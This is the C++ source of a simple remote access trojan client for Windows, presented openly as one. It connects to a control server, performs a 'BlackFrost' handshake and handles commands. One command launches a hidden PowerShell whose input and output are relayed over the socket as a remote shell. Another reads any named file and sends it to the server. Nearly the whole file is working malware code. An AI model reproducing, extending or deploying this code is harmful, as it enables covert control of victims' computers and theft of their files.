// simpleRAT.cpp : This file contains the 'main' function. Program execution begins and ends there.
//


#include "Header.h"

enum CmdStatus
{
    SUCCESSFUL = 0,
    CLIENT_ERROR = 1,   //if there is an error with windows api functions, send the error code back to the client
    SERVER_ERROR = 2,     //indicates server is turned off or an error in the communication
    HANDSHAKE_ERROR = 3,

};

int keepRunning = 1;
HANDLE newStdIn, writeStdIn;
HANDLE newStdOut, readStdOut;
PROCESS_INFORMATION powershell;

bool initWSA()
{
    WSADATA wsaData;
    int iResult;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed: %d\n", iResult);
        return 1;
    }
    return 0;
}

bool performHandshake(SOCKET s)
{
    const char* handshake = "BlackFrost";
    char response[16];
    ZeroMemory(response, 16);
    send(s, handshake, strlen(handshake), 0);
    int byteRead = recv(s, response, 11, 0);
    if (byteRead == 0)
    {
        puts("Connection to server is closed");
        return false;
    }
    else if (byteRead > 0)
    {
        if (strncmp(response, handshake, 10) == 0) return true;
        else return false;
    }
    else
    {
        printf("recv failed: %d\n", WSAGetLastError());
        return false;
    }

}

int spawnPowerShell(SOCKET s)
{
    SECURITY_ATTRIBUTES pipeAttr;
    pipeAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    pipeAttr.bInheritHandle = true;
    pipeAttr.lpSecurityDescriptor = NULL;

    CreatePipe(&newStdIn, &writeStdIn, &pipeAttr, 0);
    CreatePipe(&readStdOut, &newStdOut, &pipeAttr, 0);

    
    STARTUPINFOA startupInfo;

    ZeroMemory(&powershell, sizeof(powershell));
    ZeroMemory(&startupInfo, sizeof(startupInfo));

    //hook stdin, stdout and stderr of the powershell
    startupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    startupInfo.hStdInput = newStdIn;
    startupInfo.hStdOutput = newStdOut;
    startupInfo.hStdError = newStdOut;
    startupInfo.wShowWindow = SW_HIDE;    //hide the windows

    bool processStatus = CreateProcessA(NULL, (LPSTR)"powershell.exe", 0, 0, true, 0, 0, 0, &startupInfo, &powershell);
    int statusForSend = 0;
    if (!processStatus)
    {
        statusForSend = GetLastError();
        send(s, (char*)&statusForSend, 4, 0);
        return CLIENT_ERROR;
    }
    char output[512];
    int byteRead;
    send(s, (char*)&statusForSend, 4, 0);   //let the server knows that powershell is spawned
    Sleep(2000);
    do
    {
        ZeroMemory(output, sizeof(output));
        //check if there is any byte to read (this function doesn't delete data from the pipe's buffer)
        PeekNamedPipe(readStdOut, output, 512, (LPDWORD)&byteRead, 0, 0);
        if (byteRead <= 0) break;

        //actually read the bytes and delete them from the pipe's buffer
        if (!ReadFile(readStdOut, output, byteRead, (LPDWORD)&byteRead, 0)) break;
        output[byteRead] = 0; //null-terminate, just to be sure

    } while (send(s, output, strlen(output), 0) > 0);

    return communicatePowerShell(s);

}

int communicatePowerShell(SOCKET s)
{
    char command[512];
    int recvStat;
    while (true)
    {
        ZeroMemory(command, sizeof(command));
        recvStat = recv(s, command, sizeof(command), 0);
        if (recvStat < 0)
        {
            puts("Server turned off");
            TerminateProcess(powershell.hProcess, 0);
            return SERVER_ERROR;
        }

        //quit if the command id is not correct
        if (*(int*)command != 2)
        {
            puts("Invalid ID");
            send(s, "Invalid ID", strlen("Invalid ID"), 0);
            continue;
        }
        int byteWritten;
        if (WriteFile(writeStdIn, command + 4, strlen(command + 4), (LPDWORD)&byteWritten, 0) == 0)
        {
            send(s, "Failed to write to pipe", 26, 0);
            continue;
        }
        char test[256];
        Sleep(3000);
        int byteRead;
        char output[4096];

        //pass data to powershell via pipe
        do
        {
            ZeroMemory(output, sizeof(output));
            //check if there is any byte to read (this function doesn't delete data from the pipe's buffer)
            PeekNamedPipe(readStdOut, output, 512, (LPDWORD)&byteRead, 0, 0);
            if (byteRead <= 0) break;

            //actually read the bytes and delete them from the pipe's buffer
            if (!ReadFile(readStdOut, output, byteRead, (LPDWORD)&byteRead, 0)) break;

        } while (send(s, output, byteRead, 0) > 0);

        if (strcmp(command + 4, "exit\n") == 0)
        {
            cleanUp();
            break;
        }
    }
    return SUCCESSFUL;
}

int getFileContent(SOCKET s, char* filename)
{
    HANDLE fileHandle = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
    int statusForSend = 0;
    if (fileHandle == INVALID_HANDLE_VALUE)
    {
        puts("Can't open file");
        statusForSend = GetLastError();
        send(s, (char*)&statusForSend, 4, 0);
        return CLIENT_ERROR;
    }

    HANDLE fileMap = CreateFileMappingA(fileHandle, NULL, PAGE_READONLY, 0, 0, NULL);
    if (fileMap == NULL)
    {
        CloseHandle(fileHandle);
        statusForSend = GetLastError();
        send(s, (char*)&statusForSend, 4, 0);
        puts("Can't create mapping");
        return CLIENT_ERROR;
    }

    BYTE* fileContent = (BYTE*)MapViewOfFile(fileMap, FILE_MAP_READ, 0, 0, 0);
    if (fileContent == NULL)
    {
        puts("Can't map view to address space");
        statusForSend = GetLastError();
        send(s, (char*)&statusForSend, 4, 0);
        return CLIENT_ERROR;
    }

    LARGE_INTEGER fileSizeStruct;
    GetFileSizeEx(fileHandle, &fileSizeStruct);
    LONGLONG fileSize = fileSizeStruct.QuadPart;
    send(s, (char*)&statusForSend, 4, 0);   //let the server that all the reading are sucessful
    if (send(s, (const char*)fileContent, fileSize, 0) <= 0) return SERVER_ERROR;

    UnmapViewOfFile(fileContent);
    CloseHandle(fileMap);
    CloseHandle(fileHandle);
    return SUCCESSFUL;

}

void cleanUp()
{
    CloseHandle(newStdIn);
    CloseHandle(newStdOut);
    CloseHandle(readStdOut);
    CloseHandle(writeStdIn);
    CloseHandle(powershell.hProcess);
    CloseHandle(powershell.hThread);

    newStdIn = 0;
    newStdOut = 0;
    readStdOut = 0;
    writeStdIn = 0;
    ZeroMemory(&powershell, sizeof(powershell));
}


int main()
{ 
    initWSA();

    int iResult;
    SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
    struct addrinfo* server = NULL;

    // Resolve the server address and port
    iResult = getaddrinfo("127.0.0.1", "8888", NULL, &server);
    if (iResult != 0) 
    {
        printf("getaddrinfo failed: %d\n", iResult);
        WSACleanup();
        return SERVER_ERROR;
    }

    if (connect(s, server->ai_addr, server->ai_addrlen) == SOCKET_ERROR)
    {
        printf("Connection error: %d", WSAGetLastError());
        exit(SERVER_ERROR);
    }

    if (!performHandshake(s))
    {
        printf("Handshake failed");
        exit(HANDSHAKE_ERROR);
    }

    while (keepRunning)
    {
        char command[256];
        ZeroMemory(command, 256);

        if (recv(s, command, 256, 0) <= 0) break;
        //printf("%d", *(int*)command);
        int status = 0;
        switch (*(int*)command)
        {
        case 1:
            puts("Exit shell");
            keepRunning = 0;   
            break;
        case 2:
            puts("Open powershell");
            status = spawnPowerShell(s);
            break;

        case 3:
            puts("Upload file");
            status = getFileContent(s, command + 4);
            break;

        default:
            puts("Invalid command id");
            break;
        }
        if (status == SERVER_ERROR) break;
    }
    cleanUp();
    closesocket(s);
    WSACleanup();
    return 0;
}